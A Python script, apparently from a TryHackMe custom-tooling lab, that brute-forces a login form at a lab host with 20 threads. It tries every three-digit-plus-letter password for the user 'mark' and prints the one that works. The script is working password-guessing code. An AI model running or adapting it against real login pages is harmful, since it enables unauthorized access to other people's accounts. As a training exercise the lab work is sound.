# reference tutorial https://tryhackme.com/room/customtoolingpython
import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

url = "http://python.thm/labs/lab1/index.php"
username = "mark"

# Generate passwords in the format 000A - 999Z
password_list = [f"{str(i).zfill(3)}{char}" for i in range(1000) for char in string.ascii_uppercase]

# Thread-safe flag to stop other threads once a password is found
found = threading.Event()

def try_password(password):
    if found.is_set():
        return  # Exit early if another thread already found the password

    data = {"username": username, "password": password}
    try:
        response = requests.post(url, data=data, timeout=5)
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            found.set()
    except requests.RequestException as e:
        print(f"[!] Error with password {password}: {e}")

def brute_force_threaded(max_threads=20):
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(try_password, password_list)

brute_force_threaded()
